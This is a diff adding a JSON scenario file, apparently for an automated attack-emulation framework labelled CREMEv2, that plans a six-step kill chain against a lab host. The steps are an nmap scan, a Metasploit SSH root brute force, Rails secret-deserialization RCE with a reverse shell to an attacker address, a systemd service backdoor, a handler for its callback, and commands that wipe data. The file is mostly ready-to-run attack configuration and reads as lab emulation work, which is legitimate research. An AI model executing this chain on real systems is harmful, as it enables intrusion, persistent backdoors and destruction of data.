@@ -1,0 +1,365 @@
+{
+  "id": "a378fe74",
+  "name": "creme_disk_wipe_10.0.0.5",
+  "description": "CREMEv2 Disk Wipe scenario \u2014 6-step kill chain.",
+  "objective": "Gain access to the target server, establish persistence, reconnect through the persistent backdoor, and wipe the disk.",
+  "target_ip": "10.0.0.5",
+  "attacker_ip": "192.168.34.6",
+  "scope": [
+    "10.0.0.5"
+  ],
+  "nodes": {
+    "recon": {
+      "id": "recon",
+      "label": "Nmap Full Scan",
+      "tactic": "reconnaissance",
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery",
+      "agent_type": "recon",
+      "objective": "Full port scan with OS detection and service versioning on 10.0.0.5.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "nmap",
+      "module": "",
+      "module_options": {},
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [
+        "nmap -O -A -p 0-65535 10.0.0.5"
+      ],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "nmap",
+        "full_scan",
+        "os_detect"
+      ]
+    },
+    "ssh_bruteforce": {
+      "id": "ssh_bruteforce",
+      "label": "SSH Brute Force (root)",
+      "tactic": "credential_access",
+      "technique_id": "T1110.001",
+      "technique_name": "Brute Force: Password Guessing",
+      "agent_type": "exploit",
+      "objective": "Brute-force SSH login for root on 10.0.0.5:22.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "metasploit",
+      "module": "auxiliary/scanner/ssh/ssh_login",
+      "module_options": {
+        "USERNAME": "root",
+        "PASS_FILE": "unix_passwords_modified.txt",
+        "RHOSTS": "10.0.0.5",
+        "RPORT": 22
+      },
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "ssh",
+        "brute_force",
+        "credential_access"
+      ]
+    },
+    "rails_exploit": {
+      "id": "rails_exploit",
+      "label": "Rails Deserialization RCE",
+      "tactic": "initial_access",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "agent_type": "exploit",
+      "objective": "Exploit Rails secret deserialization on 10.0.0.5:8181 for reverse shell, then upgrade to meterpreter.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "metasploit",
+      "module": "exploit/multi/http/rails_secret_deserialization",
+      "module_options": {
+        "RHOSTS": "10.0.0.5",
+        "RPORT": 8181,
+        "TARGETURI": "/",
+        "SECRET": "a7aebc287bba0ee4e64f947415a94e5f"
+      },
+      "payload": "ruby/shell_reverse_tcp",
+      "payload_options": {
+        "LHOST": "192.168.34.6",
+        "LPORT": 4444
+      },
+      "commands_to_run": [],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {
+        "post_module": "post/multi/manage/shell_to_meterpreter",
+        "post_options": {
+          "SESSION": 1
+        }
+      },
+      "tags": [
+        "rails",
+        "deserialization",
+        "rce",
+        "meterpreter"
+      ]
+    },
+    "persistence": {
+      "id": "persistence",
+      "label": "Service Persistence",
+      "tactic": "persistence",
+      "technique_id": "T1543.002",
+      "technique_name": "Create or Modify System Process: Systemd Service",
+      "agent_type": "persistence",
+      "objective": "Install a persistent service backdoor via meterpreter, then kill all initial sessions.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "metasploit",
+      "module": "exploit/linux/local/service_persistence",
+      "module_options": {
+        "SESSION": 2,
+        "VERBOSE": true
+      },
+      "payload": "cmd/unix/reverse_python",
+      "payload_options": {
+        "LHOST": "192.168.34.6"
+      },
+      "commands_to_run": [],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {
+        "cleanup_sessions": [
+          1,
+          2,
+          3
+        ]
+      },
+      "tags": [
+        "persistence",
+        "service",
+        "systemd"
+      ]
+    },
+    "reconnect": {
+      "id": "reconnect",
+      "label": "Catch Persistence Callback",
+      "tactic": "command_and_control",
+      "technique_id": "T1571",
+      "technique_name": "Non-Standard Port",
+      "agent_type": "exploit",
+      "objective": "Start multi/handler to catch the persistence service callback.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "metasploit",
+      "module": "exploit/multi/handler",
+      "module_options": {},
+      "payload": "cmd/unix/reverse_python",
+      "payload_options": {
+        "LHOST": "192.168.34.6"
+      },
+      "commands_to_run": [],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "handler",
+        "listener",
+        "c2",
+        "reconnect"
+      ]
+    },
+    "disk_wipe": {
+      "id": "disk_wipe",
+      "label": "Disk Wipe (/tmp)",
+      "tactic": "impact",
+      "technique_id": "T1561.001",
+      "technique_name": "Disk Wipe: Disk Content Wipe",
+      "agent_type": "impact",
+      "objective": "Install the 'wipe' utility and wipe /tmp to destroy data.",
+      "target_ip": "10.0.0.5",
+      "tool_name": "wipe",
+      "module": "",
+      "module_options": {},
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [
+        "apt install wipe -y",
+        "wipe -f /tmp"
+      ],
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 1,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-03-19T07:01:32.115996+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {
+        "wipe_target": "/tmp"
+      },
+      "tags": [
+        "destructive",
+        "disk_wipe",
+        "impact"
+      ]
+    }
+  },
+  "edges": [
+    {
+      "source": "recon",
+      "target": "ssh_bruteforce",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "ports",
+          "operator": "any_port",
+          "expected": {
+            "port": 22,
+            "service": "ssh"
+          },
+          "description": "SSH service is open on port 22"
+        }
+      ],
+      "evidence": "Nmap found SSH on port 22",
+      "rationale": "SSH is open \u2014 attempt root brute force with common password list",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "recon",
+      "target": "rails_exploit",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "ports",
+          "operator": "any_port",
+          "expected": {
+            "port": 8181
+          },
+          "description": "Rails application is running on port 8181"
+        },
+        {
+          "field": "os_detected",
+          "operator": "contains",
+          "expected": "Linux",
+          "description": "Target OS is Linux"
+        }
+      ],
+      "evidence": "Nmap found Rails app on port 8181, OS: Linux",
+      "rationale": "Rails app with known secret_key_base \u2014 deserialization RCE is reliable on Linux",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "ssh_bruteforce",
+      "target": "rails_exploit",
+      "condition": "always",
+      "checks": [],
+      "evidence": "SSH brute force completed (success or failure)",
+      "rationale": "Rails exploit proceeds regardless \u2014 SSH was opportunistic noise",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "rails_exploit",
+      "target": "persistence",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "session_id",
+          "operator": "exists",
+          "expected": null,
+          "description": "Active session obtained"
+        },
+        {
+          "field": "session_type",
+          "operator": "equals",
+          "expected": "meterpreter",
+          "description": "Session is meterpreter (required for post modules)"
+        }
+      ],
+      "evidence": "Got reverse shell session 1, upgraded to meterpreter session 2",
+      "rationale": "Meterpreter required for linux/local/service_persistence module",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "persistence",
+      "target": "reconnect",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "success",
+          "operator": "equals",
+          "expected": "True",
+          "description": "Persistence mechanism was installed"
+        }
+      ],
+      "evidence": "Service persistence installed, original sessions terminated",
+      "rationale": "All original sessions killed \u2014 need handler to catch the persistence service callback",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "reconnect",
+      "target": "disk_wipe",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "session_id",
+          "operator": "exists",
+          "expected": null,
+          "description": "New session established via persistence callback"
+        }
+      ],
+      "evidence": "Caught persistence callback, new session active",
+      "rationale": "Stable session through persistence \u2014 ready to execute disk wipe",
+      "label": "",
+      "metadata": {}
+    }
+  ],
+  "known_credentials": [],
+  "active_sessions": [],
+  "discovered_hosts": [],
+  "status": "planned",
+  "created_at": "2026-03-19T07:01:32.115996+00:00",
+  "started_at": "",
+  "completed_at": "",
+  "metadata": {
+    "scenario": "02_disk_wipe",
+    "source": "CREMEv2"
+  },
+  "version": "1.0"
+}
